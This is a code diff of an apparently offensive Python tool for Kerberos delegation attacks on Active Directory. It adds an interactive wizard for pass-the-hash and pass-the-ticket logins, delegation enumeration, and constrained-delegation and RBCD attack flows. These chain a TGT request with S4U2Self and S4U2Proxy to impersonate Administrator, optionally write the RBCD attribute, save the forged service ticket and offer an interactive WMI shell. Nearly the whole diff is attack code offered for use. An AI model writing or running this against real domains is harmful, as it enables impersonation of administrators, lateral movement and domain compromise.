+    print(Fore.MAGENTA + "\n[ CONSTRAINED DELEGATION FLOW ]" + Style.RESET_ALL)
     print(f"  Service account:  {args.username}")
     print(f"  Impersonating:    {args.impersonate}")
     print(f"  Target SPN:       {args.target_spn}")
-    s4u_via_getST(args, password, nt_hash)
+
+    # Step 1: Get TGT
+    tgt, cipher, old_sk, sk = get_tgt(args.username, args.domain, args.dc, password, nt_hash)
+
+    # Step 2: S4U2Self
+    tgs_self_raw = manual_s4u2self(args.username, args.domain, args.dc, args.impersonate, tgt, cipher, sk)
+    if not tgs_self_raw:
+        print(Fore.RED + "[-] S4U2Self failed, aborting." + Style.RESET_ALL)
+        return
+
+    # Step 3: S4U2Proxy
+    tgs_proxy_raw = manual_s4u2proxy(args.username, args.domain, args.dc, args.target_spn, args.impersonate, tgs_self_raw, tgt, cipher, sk)
+    if not tgs_proxy_raw:
+        print(Fore.RED + "[-] S4U2Proxy failed, aborting." + Style.RESET_ALL)
+        return
+
+    # Step 4: Save ticket
+    ccache = save_ticket(tgs_proxy_raw, args.domain, args.target_spn, args.impersonate)
+
+    # Offer WMI shell
+    try:
+        shell_ans = get_input(
+            Fore.CYAN + f"\n[?] Open interactive WMI shell as {args.impersonate} now? (y/n) [n]: " + Style.RESET_ALL,
+            allow_empty=True, default="n"
+        )
+        if shell_ans.lower() in ("y", "yes"):
+            _launch_wmi_shell_with_ccache(args, ccache)
+    except KeyboardInterrupt:
+        pass
 
 
 def flow_rbcd(args, password, nt_hash):
-    """
-    RBCD ATTACK FLOW
-    ════════════════
-    Prerequisite:
-      You have WRITE access to target computer object (via bad ACL),
-      AND you control a machine account or have addcomputer rights.
-    """
-    print(f"\n{M}{BO}[ RBCD FLOW ]{RS}")
+    print(Fore.MAGENTA + "\n[ RBCD FLOW ]" + Style.RESET_ALL)
     print(f"  Our account:      {args.username}")
     print(f"  Impersonating:    {args.impersonate}")
     print(f"  Target computer:  {args.target_computer}")
@@ -924,7 +933,7 @@ def flow_rbcd(args, password, nt_hash):
 
     if args.setup_rbcd:
         if not args.attacker_sid:
-            print(f"{R}[!] Attacker SID required for RBCD setup{RS}")
+            print(Fore.RED + "[!] Attacker SID required for RBCD setup" + Style.RESET_ALL)
             sys.exit(1)
         ok = rbcd_setup(
             args.dc, args.domain, args.username, password,
@@ -933,153 +942,230 @@ def flow_rbcd(args, password, nt_hash):
         if not ok:
             sys.exit(1)
 
-    s4u_via_getST(args, password, nt_hash)
+    # Step 1: Get TGT
+    tgt, cipher, old_sk, sk = get_tgt(args.username, args.domain, args.dc, password, nt_hash)
+
+    # Step 2: S4U2Self
+    tgs_self_raw = manual_s4u2self(args.username, args.domain, args.dc, args.impersonate, tgt, cipher, sk)
+    if not tgs_self_raw:
+        print(Fore.RED + "[-] S4U2Self failed, aborting." + Style.RESET_ALL)
+        return
+
+    # Step 3: S4U2Proxy
+    tgs_proxy_raw = manual_s4u2proxy(args.username, args.domain, args.dc, args.target_spn, args.impersonate, tgs_self_raw, tgt, cipher, sk)
+    if not tgs_proxy_raw:
+        print(Fore.RED + "[-] S4U2Proxy failed, aborting." + Style.RESET_ALL)
+        return
+
+    # Step 4: Save ticket
+    ccache = save_ticket(tgs_proxy_raw, args.domain, args.target_spn, args.impersonate)
+
+    # Offer WMI shell
+    try:
+        shell_ans = get_input(
+            Fore.CYAN + f"\n[?] Open interactive WMI shell as {args.impersonate} now? (y/n) [n]: " + Style.RESET_ALL,
+            allow_empty=True, default="n"
+        )
+        if shell_ans.lower() in ("y", "yes"):
+            _launch_wmi_shell_with_ccache(args, ccache)
+    except KeyboardInterrupt:
+        pass
 
 
 # ─────────────────────────────────────────────────────────────────────────────
-# INTERACTIVE WIZARD
+# MAIN
 # ─────────────────────────────────────────────────────────────────────────────
-def ask(prompt, default="", secret=False):
-    """Prompt the user; show default in [brackets]; hide input if secret."""
-    display = f"{W}{prompt}"
-    if default:
-        display += f" {Y}[{default}]{W}"
-    display += f": {RS}"
-    if secret:
-        # Strip ANSI codes from getpass prompt — some terminals render them as raw chars
-        clean_prompt = re.sub(r'\033\[[0-9;]*m', '', display)
-        val = getpass.getpass(clean_prompt)
-    else:
-        val = input(display).strip()
-    return val if val else default
+if __name__ == '__main__':
+    banner()
 
+    # DC IP
+    dc_ip = get_input(
+        Fore.CYAN + "[?] Enter DC IP Address  : " + Style.RESET_ALL,
+        validate_ip, "Invalid IP! Example: 192.168.x.x"
+    )
+    print(Fore.BLUE + "[*] Checking DC reachability..." + Style.RESET_ALL)
+    if not check_ip_reachable(dc_ip):
+        print(Fore.RED + f"[!] Cannot reach {dc_ip}!" + Style.RESET_ALL)
+        sys.exit(1)
+    print(Fore.GREEN + f"[+] DC {dc_ip} is reachable!" + Style.RESET_ALL)
 
-def interactive_wizard():
-    """
-    Ask the user all required questions and return (args, password).
-    args is a SimpleNamespace compatible with flow_constrained / flow_rbcd.
-    """
+    # Domain
+    domain = get_input(
+        Fore.CYAN + "[?] Enter Domain Name    : " + Style.RESET_ALL,
+        validate_domain, "Invalid domain! Example: domain.com"
+    )
 
-    print(f"\n{M}{BO}{'━'*55}")
-    print(f"  INTERACTIVE SETUP WIZARD")
-    print(f"{'━'*55}{RS}")
-    print(f"  {Y}Press ENTER to accept the default shown in [brackets]{RS}\n")
+    # Auth type selection
+    print(Fore.CYAN + "\n[?] Choose authentication type:" + Style.RESET_ALL)
+    print(Fore.WHITE + "    1. Password")
+    print(Fore.WHITE + "    2. Pass-the-Hash (NTLM)")
+    print(Fore.WHITE + "    3. Pass-the-Ticket (Kerberos)")
 
+    auth_choice = get_input(
+        Fore.CYAN + "[?] Your choice          : " + Style.RESET_ALL,
+        lambda x: x in ['1', '2', '3'],
+        "Invalid choice! Enter 1, 2 or 3"
+    )
+
+    auth_type = 'password'
+    lmhash = ''
+    nthash = ''
+    ticket_file = ''
+    password = ''
+
+    if auth_choice == '1':
+        auth_type = 'password'
+        username = get_input(Fore.CYAN + "[?] Enter Username       : " + Style.RESET_ALL)
+        password = get_input(Fore.CYAN + "[?] Enter Password       : " + Style.RESET_ALL, secret=True)
+    elif auth_choice == '2':
+        auth_type = 'hash'
+        username = get_input(Fore.CYAN + "[?] Enter Username       : " + Style.RESET_ALL)
+        hash_input = get_input(
+            Fore.CYAN + "[?] Enter NTLM Hash (LM:NT or NT) : " + Style.RESET_ALL,
+            validate_hash, "Invalid hash! Format: aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0"
+        )
+        if ':' in hash_input:
+            lmhash, nthash = hash_input.split(':')
+        else:
+            lmhash = 'aad3b435b51404eeaad3b435b51404ee'
+            nthash = hash_input
+        lmhash = lmhash.lower()
+        nthash = nthash.lower()
+    elif auth_choice == '3':
+        auth_type = 'ticket'
+        username = get_input(Fore.CYAN + "[?] Enter Username       : " + Style.RESET_ALL)
+        ticket_file = get_input(Fore.CYAN + "[?] Enter Ticket File Path (ccache) : " + Style.RESET_ALL)
+        if not os.path.exists(ticket_file):
+            print(Fore.RED + f"[!] Ticket file not found: {ticket_file}" + Style.RESET_ALL)
+            sys.exit(1)
+
+    # Verify credentials
+    print(Fore.BLUE + "[*] Verifying credentials and domain..." + Style.RESET_ALL)
+    result = check_credentials_and_domain(dc_ip, domain, username, password, auth_type, lmhash, nthash, ticket_file)
+    if result == "invalid_credentials":
+        print(Fore.RED + "[!] Invalid credentials!" + Style.RESET_ALL)
+        sys.exit(1)
+    elif not result:
+        print(Fore.RED + f"[!] Domain '{domain}' not found!" + Style.RESET_ALL)
+        sys.exit(1)
+    print(Fore.GREEN + "[+] Credentials verified!" + Style.RESET_ALL)
+    print(Fore.GREEN + f"[+] Domain '{domain}' verified!" + Style.RESET_ALL)
+
+    # Mode selection
+    print(Fore.CYAN + "\n[?] Choose attack mode:" + Style.RESET_ALL)
+    print(Fore.WHITE + "    1. Enumerate delegation accounts (recon)")
+    print(Fore.WHITE + "    2. Constrained Delegation attack")
+    print(Fore.WHITE + "    3. Resource-Based Constrained Delegation (RBCD) attack")
+
+    mode_choice = get_input(
+        Fore.CYAN + "[?] Your choice          : " + Style.RESET_ALL,
+        lambda x: x in ['1', '2', '3'],
+        "Invalid choice! Enter 1, 2 or 3"
+    )
+
+    # Build args namespace
+    import types
     args = types.SimpleNamespace()
+    args.dc = dc_ip
+    args.domain = domain
+    args.username = username
+    args.nt_hash = nthash
+    args.impersonate = "Administrator"
+    args.target_spn = ""
+    args.target_computer = ""
+    args.setup_rbcd = False
+    args.attacker_sid = ""
 
-    # ── Mode ──────────────────────────────────────────────────────────────
-    print(f"{C}{BO}  SELECT MODE{RS}")
-    print(f"  {W}1{RS} — Enumerate delegation accounts  {Y}(start here — recon){RS}")
-    print(f"  {W}2{RS} — Constrained Delegation attack")
-    print(f"  {W}3{RS} — Resource-Based Constrained Delegation (RBCD) attack")
-    print()
-    while True:
-        mode = ask("  Mode (1/2/3)", default="1")
-        if mode in ("1", "2", "3"):
-            break
-        print(f"  {R}Please enter 1, 2, or 3{RS}")
+    if mode_choice == '1':
+        ldap_enum_delegation(dc_ip, domain, username, password, nthash)
 
-    args.enum        = (mode == "1")
-    args.constrained = (mode == "2")
-    args.rbcd        = (mode == "3")
-
-    # ── Network ───────────────────────────────────────────────────────────
-    print(f"\n{C}{BO}  NETWORK{RS}")
-    args.domain = ask("  Domain", default="domain.com")
-    args.dc     = ask("  DC IP ", default="192.168.x.x")
-
-    # ── Credentials ───────────────────────────────────────────────────────
-    print(f"\n{C}{BO}  CREDENTIALS{RS}")
-    args.username = ask("  Username", default="Administrator")
-
-    print(f"  {W}Auth type — (1) Password  (2) NT Hash{RS}")
-    auth_choice = ask("  Choice", default="1")
-    if auth_choice == "2":
-        args.nt_hash = ask("  NT Hash (hex)", secret=True)
-        password     = ""
-    else:
-        password     = ask("  Password", secret=True)
-        args.nt_hash = ""
-
-    # ── Attack-specific params ────────────────────────────────────────────
-    if args.constrained or args.rbcd:
-        print(f"\n{C}{BO}  ATTACK PARAMETERS{RS}")
-        args.impersonate = ask("  User to impersonate", default="Administrator")
-        args.target_spn  = ask("  Target SPN (e.g. cifs/DC.domain.com)")
+    elif mode_choice == '2':
+        args.impersonate = get_input(
+            Fore.CYAN + "[?] User to impersonate [default: Administrator]: " + Style.RESET_ALL,
+            allow_empty=True, default="Administrator"
+        )
+        args.target_spn = get_input(
+            Fore.CYAN + "[?] Target SPN (e.g. cifs/DC.domain.com): " + Style.RESET_ALL
+        )
         if not args.target_spn:
-            print(f"  {R}[!] Target SPN is required{RS}")
+            print(Fore.RED + "[!] Target SPN is required" + Style.RESET_ALL)
             sys.exit(1)
-    else:
-        args.impersonate = "Administrator"
-        args.target_spn  = ""
 
-    if args.rbcd:
-        args.target_computer = ask("  Target computer name (e.g. WIN-RM9TRCNVS9P)")
+        print(f"\n{Fore.GREEN}{'-'*52}")
+        print(f"  Mode:        Constrained Delegation")
+        print(f"  Domain:      {domain}")
+        print(f"  DC IP:       {dc_ip}")
+        print(f"  Username:    {username}")
+        print(f"  Auth:        {'NT Hash' if nthash else 'Password'}")
+        print(f"  Impersonate: {args.impersonate}")
+        print(f"  Target SPN:  {args.target_spn}")
+        print(f"{'-'*52}{Style.RESET_ALL}\n")
+
+        confirm = get_input(
+            Fore.CYAN + "[?] Proceed? (y/n) [y]: " + Style.RESET_ALL,
+            allow_empty=True, default="y"
+        )
+        if confirm.lower() != 'y':
+            print(Fore.YELLOW + "[!] Aborted." + Style.RESET_ALL)
+            sys.exit(0)
+
+        flow_constrained(args, password, nthash)
+
+    elif mode_choice == '3':
+        args.impersonate = get_input(
+            Fore.CYAN + "[?] User to impersonate [default: Administrator]: " + Style.RESET_ALL,
+            allow_empty=True, default="Administrator"
+        )
+        args.target_computer = get_input(
+            Fore.CYAN + "[?] Target computer name (e.g. WIN-PC01): " + Style.RESET_ALL
+        )
         if not args.target_computer:
-            print(f"  {R}[!] Target computer is required for RBCD{RS}")
+            print(Fore.RED + "[!] Target computer is required for RBCD" + Style.RESET_ALL)
             sys.exit(1)
 
-        print(f"\n{C}{BO}  RBCD SETUP{RS}")
-        print(f"  {Y}If you have WRITE access to the target computer object,")
-        print(f"  the script can write the delegation attribute for you.{RS}")
-        setup = ask("  Write RBCD attribute now? (y/n)", default="n")
-        args.setup_rbcd = setup.lower() == "y"
+        args.target_spn = get_input(
+            Fore.CYAN + "[?] Target SPN (e.g. cifs/WIN-PC01.domain.com): " + Style.RESET_ALL
+        )
+        if not args.target_spn:
+            print(Fore.RED + "[!] Target SPN is required" + Style.RESET_ALL)
+            sys.exit(1)
+
+        print(Fore.CYAN + "\n[?] RBCD Setup:" + Style.RESET_ALL)
+        print(Fore.YELLOW + "  If you have WRITE access to the target computer object," + Style.RESET_ALL)
+        print(Fore.YELLOW + "  the script can write the delegation attribute for you." + Style.RESET_ALL)
+
+        setup = get_input(
+            Fore.CYAN + "[?] Write RBCD attribute now? (y/n) [n]: " + Style.RESET_ALL,
+            allow_empty=True, default="n"
+        )
+        args.setup_rbcd = setup.lower() == 'y'
 
         if args.setup_rbcd:
-            args.attacker_sid = ask("  Your account SID (S-1-5-21-...)")
-            if not args.attacker_sid:
-                print(f"  {R}[!] Attacker SID is required for RBCD setup{RS}")
-                sys.exit(1)
-        else:
-            args.attacker_sid = ""
-    else:
-        args.target_computer = ""
-        args.setup_rbcd      = False
-        args.attacker_sid    = ""
+            args.attacker_sid = get_input(
+                Fore.CYAN + "[?] Your account SID (S-1-5-21-...): " + Style.RESET_ALL,
+                validate_sid, "Invalid SID format! Example: S-1-5-21-1234567890-1234567890-1234567890-1234"
+            )
 
-    # ── Summary before running ────────────────────────────────────────────
-    mode_label = {"1": "Enumerate", "2": "Constrained Delegation", "3": "RBCD"}[mode]
-    print(f"\n{G}{BO}{'━'*55}")
-    print(f"  CONFIGURATION SUMMARY")
-    print(f"{'━'*55}{RS}")
-    print(f"  {C}Mode:        {W}{mode_label}{RS}")
-    print(f"  {C}Domain:      {W}{args.domain}{RS}")
-    print(f"  {C}DC IP:       {W}{args.dc}{RS}")
-    print(f"  {C}Username:    {W}{args.username}{RS}")
-    print(f"  {C}Auth:        {W}{'NT Hash' if args.nt_hash else 'Password'}{RS}")
-    if args.constrained or args.rbcd:
-        print(f"  {C}Impersonate: {W}{args.impersonate}{RS}")
-        print(f"  {C}Target SPN:  {W}{args.target_spn}{RS}")
-    if args.rbcd:
-        print(f"  {C}Target PC:   {W}{args.target_computer}{RS}")
-        print(f"  {C}Setup RBCD:  {W}{args.setup_rbcd}{RS}")
-    print()
+        print(f"\n{Fore.GREEN}{'-'*52}")
+        print(f"  Mode:        RBCD")
+        print(f"  Domain:      {domain}")
+        print(f"  DC IP:       {dc_ip}")
+        print(f"  Username:    {username}")
+        print(f"  Auth:        {'NT Hash' if nthash else 'Password'}")
+        print(f"  Impersonate: {args.impersonate}")
+        print(f"  Target SPN:  {args.target_spn}")
+        print(f"  Target PC:   {args.target_computer}")
+        print(f"  Setup RBCD:  {args.setup_rbcd}")
+        print(f"{'-'*52}{Style.RESET_ALL}\n")
 
-    confirm = ask(f"{G}  Proceed? (y/n)", default="y")
-    if confirm.lower() != "y":
-        print(f"  {Y}Aborted.{RS}")
-        sys.exit(0)
+        confirm = get_input(
+            Fore.CYAN + "[?] Proceed? (y/n) [y]: " + Style.RESET_ALL,
+            allow_empty=True, default="y"
+        )
+        if confirm.lower() != 'y':
+            print(Fore.YELLOW + "[!] Aborted." + Style.RESET_ALL)
+            sys.exit(0)
 
-    return args, password
+        flow_rbcd(args, password, nthash)
 
-
-# ─────────────────────────────────────────────────────────────────────────────
-# ENTRY POINT
-# ─────────────────────────────────────────────────────────────────────────────
-def main():
-    print(BANNER)
-    args, password = interactive_wizard()
-    nt_hash = args.nt_hash or ""
-
-    if args.enum:
-        ldap_enum_delegation(args.dc, args.domain, args.username, password, nt_hash)
-
-    elif args.constrained:
-        flow_constrained(args, password, nt_hash)
-
-    elif args.rbcd:
-        flow_rbcd(args, password, nt_hash)
-
-
-if __name__ == "__main__":
-    main()
+    print(Fore.GREEN + "\n[+] Done!" + Style.RESET_ALL)
